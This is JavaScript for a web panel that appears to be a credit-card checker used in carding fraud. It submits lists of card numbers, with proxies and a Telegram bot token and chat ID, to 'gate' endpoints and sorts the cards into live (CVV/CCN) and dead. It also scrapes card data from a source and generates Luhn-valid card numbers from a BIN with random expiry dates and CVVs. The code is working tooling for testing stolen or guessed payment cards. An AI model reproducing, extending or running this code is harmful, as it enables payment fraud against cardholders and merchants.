    <script>
        document.addEventListener('DOMContentLoaded', function () {
            var oForwarderModalButton = document.getElementById('oForwarderModal');
            var testButton = document.getElementById('testButton');
            var testResult = document.getElementById('testResult');
            var resultMessage = document.getElementById('resultMessage');
            var botTokenInput = document.getElementById('botToken');
            var chatIDInput = document.getElementById('chatID'); 

            oForwarderModalButton.addEventListener('click', function () {
                var modal = new bootstrap.Modal(document.getElementById('forwarderModal'));
                modal.show();
            });

            testButton.addEventListener('click', function () {
                var botTokenValue = botTokenInput.value.trim();
                var chatIDValue = chatIDInput.value.trim();

                if (botTokenValue === '' || chatIDValue === '') {
                    resultMessage.textContent = 'Please enter valid BOT TOKEN and CHAT ID';
                    resultMessage.style.color = 'red';
                    testResult.style.display = 'block';
                    return;
                }

                var apiUrl = `https://api.telegram.org/bot${botTokenValue}/sendMessage?chat_id=${chatIDValue}&text=ZXC MAHINA&parse_mode=html`;
                
                fetch(apiUrl)
                    .then(response => {
                        if (response.ok) {
                            return response.json();
                        }
                        throw new Error(''); 
                    })
                    .then(data => {
                        resultMessage.textContent = 'Message sent successfully!';
                        resultMessage.style.color = 'green';
                        testResult.style.display = 'block';
                    })
                    .catch(error => {
                        resultMessage.textContent = 'Failed to send message.';
                        resultMessage.style.color = 'red';
                        testResult.style.display = 'block';
                    });
            });
        });
    </script>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            var editIcon = document.getElementById('editIcon');
            var sitesInput = document.getElementById('sites');
            var modalInput = document.getElementById('modalInput');
            var saveButton = document.getElementById('saveButton');
            var formatButton = document.getElementById('formatButton');
            var lineNumbers = document.getElementById('lineNumbers');

            function updateLineNumbers() {
                var lines = modalInput.value.split('\n').length;
                lineNumbers.innerHTML = '';
                for (var i = 1; i <= lines; i++) {
                    lineNumbers.innerHTML += i + '<br>';
                }
            }

            editIcon.addEventListener('click', function () {
                var inputText = sitesInput.value;
                var urlPattern = /((http:\/\/|https:\/\/)[^\s,]+)/g;
                var matches = inputText.match(urlPattern);

                if (matches) {
                    modalInput.value = matches.join('\n');
                } else {
                    modalInput.value = '';
                }

                updateLineNumbers();

                var modal = new bootstrap.Modal(document.getElementById('sitesModal'));
                modal.show();
            });

            modalInput.addEventListener('input', function () {
                updateLineNumbers();
            });

            modalInput.addEventListener('scroll', function () {
                lineNumbers.scrollTop = modalInput.scrollTop;
            });

            saveButton.addEventListener('click', function () {
                var inputText = modalInput.value;
                var urls = inputText.split('\n').filter(Boolean);

                sitesInput.value = urls.join(',');
                var modalElement = document.getElementById('sitesModal');
                var modal = bootstrap.Modal.getInstance(modalElement);
                modal.hide();
            });

            formatButton.addEventListener('click', function () {
                var inputText = modalInput.value;
                var urlPattern = /((http:\/\/|https:\/\/)[^\s,]+)/g;
                var matches = inputText.match(urlPattern);

                if (matches) {
                    var formattedUrls = matches.map(function (url) {
                        return url.trim();
                    });
                    modalInput.value = formattedUrls.join('\n');
                } else {
                    modalInput.value = '';
                }

                updateLineNumbers();
            });
        });
    </script>

<script type="text/javascript">
    $(document).ready(function () {
        let activeRequests = 0;
        let maxCount = 5;
        let stopRequest = false;
        let queue = []; 

        const cvvSound = new Audio('assets/sounds/cvv.mp3');
        const ccnSound = new Audio('assets/sounds/ccn.mp3');

        $("#concurrent-bar").on("input", function () {
            maxCount = $(this).val();
            $("#concurrent-value").text(maxCount + "");
        });

        $("#config-visibility").click(function () {
            const isHidden = $("#proxy").attr("type") === "text";
            $("#proxy, #sites, #scraper").attr("type", isHidden ? "password" : "text");
            $("#config-visibility .material-symbols-outlined").text(isHidden ? "visibility_off" : "visibility");
        });

        $("#cvv-show-btn").click(() => $("#cvv-div").slideToggle());
        $("#ccn-show-btn").click(() => $("#ccn-div").slideToggle());
        $("#dead-show-btn").click(() => $("#dead-div").slideToggle());

        $("#cvv-clear-btn").click(() => $(".m").remove());
        $("#ccn-clear-btn").click(() => $(".n").remove());
        $("#dead-clear-btn").click(() => $(".d").remove());

        $("#cvv-copy-btn").click(() => copyToClipboard("#cvv-div"));
        $("#ccn-copy-btn").click(() => copyToClipboard("#ccn-div"));
        $("#dead-copy-btn").click(() => copyToClipboard("#dead-div"));

        function copyToClipboard(selector) {
            var text = $(selector).find('div').map(function () {
                return $(this).text().replace(/\s+/g, ' ').trim();
            }).get().join("\n");

            var $temp = $("<textarea>");
            $("body").append($temp);
            $temp.val(text).select();
            document.execCommand("copy");
            $temp.remove();

            Swal.fire({
                title: "Copied to Clipboard!",
                text: "Results copied.",
                icon: "success",
                customClass: {
                    confirmButton: 'swal2-confirm',
                    popup: 'swal2-popup'
                }
            });
        }

        $("#format").click(function () {
            var card = $("#cards").val();
            $("#cards").val(
                Array.from(new Set(card.match(/(?:\d{10,}|\d+)\|\d*\|\d*\|\d*/g) || [])).join("\n")
            );
        });

        $("#start").click(function () {
            stopRequest = false; 
            let card = $("#cards").val().split("\n");
            let gate = $("#gates").val();
            let proxy = $("#proxy").val();
            let sites = $("#sites").val();
            let botToken = $("#botToken").val();
            let chatID = $("#chatID").val();
            let xlite = $("#xlite").val();
            let total = card.length;
            let cvv = 0, ccn = 0, dead = 0, remaining = total;
            Swal.fire({
                title: "Checker Started!",
                text: 'Checking ' + total + ' card/s.',
                icon: "success",
                customClass: {
                    confirmButton: 'swal2-confirm',
                    popup: 'swal2-popup'
                }
            });

            let index = 0;

            function processQueue() {
                if (stopRequest || index >= card.length || activeRequests >= maxCount) return;

                let value = card[index++];
                queue.push(value);

                if (activeRequests < maxCount) {
                    sendRequest(queue.shift());
                }
            }

            function sendRequest(value) {
                activeRequests++;

                $.ajax({
                    url: 'api/' + gate + '?card=' + value +
                        '&proxy=' + proxy +
                        '&sites=' + sites +
                        '&botToken=' + botToken +
                        '&chatID=' + chatID +
                        '&xlite=' + xlite,
                    type: 'GET',
                    async: true,
                    success: function (result) {
                        if (result.includes("#CVV")) {
                            $("#cvv-div").append('<div class="m"><span class="badge"> CVV </span> ' + value + ' ' + result.replace("#CVV ", "") + '</div>');
                            cvv++;
                            cvvSound.play();
                        } else if (result.includes("#CCN")) {
                            $("#ccn-div").append('<div class="n"><span class="badge"> CCN </span> ' + value + ' ' + result.replace("#CCN ", "") + '</div>');
                            ccn++;
                            ccnSound.play();
                        } else {
                            $("#dead-div").append('<div class="d"><span class="badge"> DEAD </span> ' + value + ' ' + result.replace("#DEAD", "") + '</div>');
                            dead++;
                        }
                        remaining--;

                        $('#m-count').html(cvv);
                        $('#n-count').html(ccn);
                        $('#d-count').html(dead);
                        $('#c-count').html(remaining);

                        update();
                    },
                    complete: function () {
                        activeRequests--;
                        if (queue.length > 0) {
                            sendRequest(queue.shift());
                        } else {
                            processQueue(); 
                        }
                    }
                });
            }

            for (let i = 0; i < maxCount && i < card.length; i++) {
                processQueue();
            }
        });

        $("#stop").click(function () {
            stopRequest = true;

            Swal.fire({
                title: "Stop Requested!",
                text: "No further requests will be initiated, but ongoing requests will continue.",
                icon: "info",
                customClass: {
                    confirmButton: 'swal2-confirm',
                    popup: 'swal2-popup'
                }
            });
        });
    });

    function progressBar() {
        var total = parseInt($('#c-count').html()) + parseInt($('#m-count').html()) + parseInt($('#n-count').html()) + parseInt($('#d-count').html());
        var remaining = parseInt($('#c-count').html());
        var percentage = ((total - remaining) / total) * 100;
        $('.progress-bar').css('width', percentage + '%');
    }

    function update() {
        var card = $("#cards").val().split("\n");
        card.splice(0, 1);
        $("#cards").val(card.join("\n"));
        progressBar();
    }
</script>







<script type="text/javascript">
    function startScraper() {
        var scraper = document.getElementById("scraper").value;

        Swal.fire({
            title: "SCRAPER STARTED!",
            text: "SCRAPING MIGHT TAKE A WHILE.",
            icon: "info",
            customClass: {
                confirmButton: 'swal2-confirm',
                popup: 'swal2-popup'
            }
        });

        var url = "scraper.php?scraper=" + encodeURIComponent(scraper);

        var xhr = new XMLHttpRequest();
        xhr.open("GET", url, true);
        xhr.onreadystatechange = function () {
            if (xhr.readyState == 4 && xhr.status == 200) {
                var ccData = xhr.responseText;
                document.getElementById("cards").value = ccData; 
            }
        };
        xhr.send();
    }

    document.getElementById("scraperButton").addEventListener("click", startScraper);
</script>

<script>
    function limit(textarea, maxLines) {
        var lines = textarea.value.split("\n");
        if (lines.length > maxLines) {
            textarea.value = lines.slice(0, maxLines).join("\n");
        }
    }
</script>

<script type="text/javascript">
    $("#generate").click(function () {
        document.getElementById("cards").value = gen();
    });

    function gen() {
        var amt = $("#amount").val();
        if (amt.length == 0) {
            amt = 100;
        }
        var ccs = [];
        for (x = 0; x < amt; x++) {
            ccs.push(generate());
        }
        return ccs.join("\n");
    }
    function rand(rlength) {
        var randa = [];
        while (randa.length < rlength) {
            var rand = Math.floor(Math.random() * 10);
            randa.push(rand);
        }
        return randa.join('');
    }

    function generate() {
        var bvbin = $("#bin").val();
        var bvmonth = $("#month").val();
        var bvyear = $("#year").val();
        var bvcvv = $("#cvv").val();
        var cci = bvbin + rand(15 - bvbin.length);
        var evena = [];
        var odda = [];
        for (var e = 0; e < 15; e += 2) {
            var even = cci[e] * 2;
            if (even.toString().length == 2) {
                even = even.toString().split('');
                even = parseInt(even[0]) + parseInt(even[1]);
            }
            evena.push(even);
        }
        for (var o = 1; o < 15; o += 2) {
            var odd = cci[o];
            odda.push(odd);
        }
        var odds = eval(odda.join('+'));
        var evens = eval(evena.join('+'));
        var total = odds + evens;
        var csum = 10 - total.toString()[1];
        if (csum == 10) {
            csum = 0;
        }
        if (fyear(bvyear).length == 4) {
            return cci + csum + '|' + fmonth(bvmonth) + '|' + fyear(bvyear) + '|' + fcvv(bvcvv);
        }
        else {
            return cci + csum + '|' + fmonth(bvmonth) + '|202' + fyear(bvyear) + '|' + fcvv(bvcvv);
        }
    }

    function fmonth(bvmonth) {
        if (bvmonth) {
            return bvmonth;
        }
        else {
            var bvmonth = Math.floor(Math.random() * 12) + 1;
            if (bvmonth.toString().length == 1) {
                bvmonth = '0' + bvmonth;
            }
            return bvmonth;
        }
    }
    function fyear(bvyear) {
        if (bvyear) {
            return bvyear;
        }
        else {
            return Math.floor(Math.random() * 8) + 2;
        }
    }

    function fcvv(bvcvv) {
        if (bvcvv) {
            return bvcvv;
        }
        else {
            cvva = [];
            while (cvva.length < 3) {
                var cvv = Math.floor(Math.random() * 10);
                cvva.push(cvv);
            }
            return cvva.join('');
        }
    }
</script>
